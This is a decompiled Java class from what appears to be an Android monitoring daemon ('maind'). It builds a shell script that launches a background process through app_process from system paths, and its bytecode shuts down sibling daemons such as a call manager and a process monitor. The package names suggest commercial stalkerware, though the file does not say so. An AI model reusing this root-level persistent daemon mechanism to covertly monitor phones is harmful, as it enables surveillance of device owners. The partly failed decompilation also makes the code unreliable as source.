package com.vvt.daemon;

import com.vvt.m.b;

public class a
  extends com.fx.daemon.a
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public void a()
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    ((StringBuilder)localObject1).append("#script\n");
    Object localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>();
    boolean bool2 = com.vvt.aa.a.g();
    Object localObject3;
    Object localObject4;
    if (bool2)
    {
      ((StringBuilder)localObject2).append("/system/lib64");
      localObject3 = "/system/lib64";
      localObject4 = b.c;
      bool2 = ((String)localObject3).equals(localObject4);
      if (!bool2)
      {
        localObject3 = ((StringBuilder)localObject2).append(":");
        localObject4 = b.c;
        ((StringBuilder)localObject3).append((String)localObject4);
      }
    }
    for (;;)
    {
      localObject4 = new Object[i];
      localObject2 = ((StringBuilder)localObject2).toString();
      localObject4[0] = localObject2;
      localObject2 = String.format("export LD_LIBRARY_PATH=%s\n", (Object[])localObject4);
      ((StringBuilder)localObject1).append((String)localObject2);
      int j = 2;
      localObject3 = new Object[j];
      localObject4 = b.c;
      localObject3[0] = localObject4;
      localObject3[i] = "maind.zip";
      localObject2 = String.format("export CLASSPATH=%s/%s;\n", (Object[])localObject3);
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject3 = new Object[i];
      localObject4 = "com.vvt.daemon.MainDaemonMain";
      localObject3[0] = localObject4;
      localObject2 = String.format("app_process /system/bin %s \\$* &\n", (Object[])localObject3);
      ((StringBuilder)localObject1).append((String)localObject2);
      localObject1 = ((StringBuilder)localObject1).toString();
      boolean bool4 = a;
      if (bool4) {}
      localObject2 = b.d;
      a((String)localObject2, (String)localObject1);
      bool1 = a;
      if (bool1) {}
      return;
      ((StringBuilder)localObject2).append("/system/lib");
      localObject3 = "/system/lib";
      localObject4 = b.c;
      boolean bool3 = ((String)localObject3).equals(localObject4);
      if (!bool3)
      {
        localObject3 = ((StringBuilder)localObject2).append(":");
        localObject4 = b.c;
        ((StringBuilder)localObject3).append((String)localObject4);
      }
    }
  }
  
  public String b()
  {
    return "maind";
  }
  
  public String c()
  {
    return b.d;
  }
  
  /* Error */
  public void f()
  {
    // Byte code:
    //   0: getstatic 11	com/vvt/daemon/a:a	Z
    //   3: istore_1
    //   4: iload_1
    //   5: ifeq +3 -> 8
    //   8: getstatic 11	com/vvt/daemon/a:a	Z
    //   11: istore_1
    //   12: iload_1
    //   13: ifeq +3 -> 16
    //   16: new 83	com/vvt/callmanager/ref/a
    //   19: astore_2
    //   20: aload_2
    //   21: invokespecial 84	com/vvt/callmanager/ref/a:<init>	()V
    //   24: aload_2
    //   25: invokevirtual 85	com/vvt/callmanager/ref/a:f	()V
    //   28: ldc 87
    //   30: astore_2
    //   31: getstatic 11	com/vvt/daemon/a:a	Z
    //   34: istore_3
    //   35: iload_3
    //   36: ifeq +3 -> 39
    //   39: new 89	com/fx/socket/command/RemoteCloseServer
    //   42: astore 4
    //   44: aload 4
    //   46: aload_2
    //   47: invokespecial 92	com/fx/socket/command/RemoteCloseServer:<init>	(Ljava/lang/String;)V
    //   50: aload 4
    //   52: invokevirtual 96	com/fx/socket/command/RemoteCloseServer:execute	()Ljava/lang/Object;
    //   55: pop
    //   56: ldc2_w 97
    //   59: lstore 5
    //   61: lload 5
    //   63: invokestatic 106	android/os/SystemClock:sleep	(J)V
    //   66: getstatic 11	com/vvt/daemon/a:a	Z
    //   69: istore_1
    //   70: iload_1
    //   71: ifeq +3 -> 74
    //   74: new 108	com/fx/psysd/d
    //   77: astore_2
    //   78: aload_2
    //   79: invokespecial 109	com/fx/psysd/d:<init>	()V
    //   82: aload_2
    //   83: invokevirtual 110	com/fx/psysd/d:f	()V
    //   86: ldc 112
    //   88: astore_2
    //   89: getstatic 11	com/vvt/daemon/a:a	Z
    //   92: istore_3
    //   93: iload_3
    //   94: ifeq +3 -> 97
    //   97: new 89	com/fx/socket/command/RemoteCloseServer
    //   100: astore 4
    //   102: aload 4
    //   104: aload_2
    //   105: invokespecial 92	com/fx/socket/command/RemoteCloseServer:<init>	(Ljava/lang/String;)V
    //   108: aload 4
    //   110: invokevirtual 96	com/fx/socket/command/RemoteCloseServer:execute	()Ljava/lang/Object;
    //   113: pop
    //   114: getstatic 11	com/vvt/daemon/a:a	Z
    //   117: istore_1
    //   118: iload_1
    //   119: ifeq +3 -> 122
    //   122: new 114	com/fx/pmond/ref/removeFromPath
    //   125: astore_2
    //   126: aload_2
    //   127: invokespecial 115	com/fx/pmond/ref/removeFromPath:<init>	()V
    //   130: aload_2
    //   131: invokevirtual 116	com/fx/pmond/ref/removeFromPath:f	()V
    //   134: getstatic 11	com/vvt/daemon/a:a	Z
    //   137: istore_1
    //   138: iload_1
    //   139: ifeq +3 -> 142
    //   142: new 118	com/vvt/daemon/removeFromPath
    //   145: astore_2
    //   146: ldc 120
    //   148: astore 4
    //   150: aload_2
    //   151: aload_0
    //   152: aload 4
    //   154: invokespecial 123	com/vvt/daemon/removeFromPath:<init>	(Lcom/vvt/daemon/a;Ljava/lang/String;)V
    //   157: aload_2
    //   158: invokevirtual 128	java/lang/Thread:start	()V
    //   161: getstatic 11	com/vvt/daemon/a:a	Z
    //   164: istore_1
    //   165: iload_1
    //   166: ifeq +3 -> 169
    //   169: return
    //   170: astore_2
    //   171: goto -115 -> 56
    //   174: astore_2
    //   175: goto -61 -> 114
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	178	0	this	a
    //   3	163	1	bool1	boolean
    //   19	139	2	localObject1	Object
    //   170	1	2	localObject2	Object
    //   174	1	2	localObject3	Object
    //   34	60	3	bool2	boolean
    //   42	111	4	localObject4	Object
    //   59	3	5	l	long
    // Exception table:
    //   from	to	target	type
    //   50	56	170	finally
    //   108	114	174	finally
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */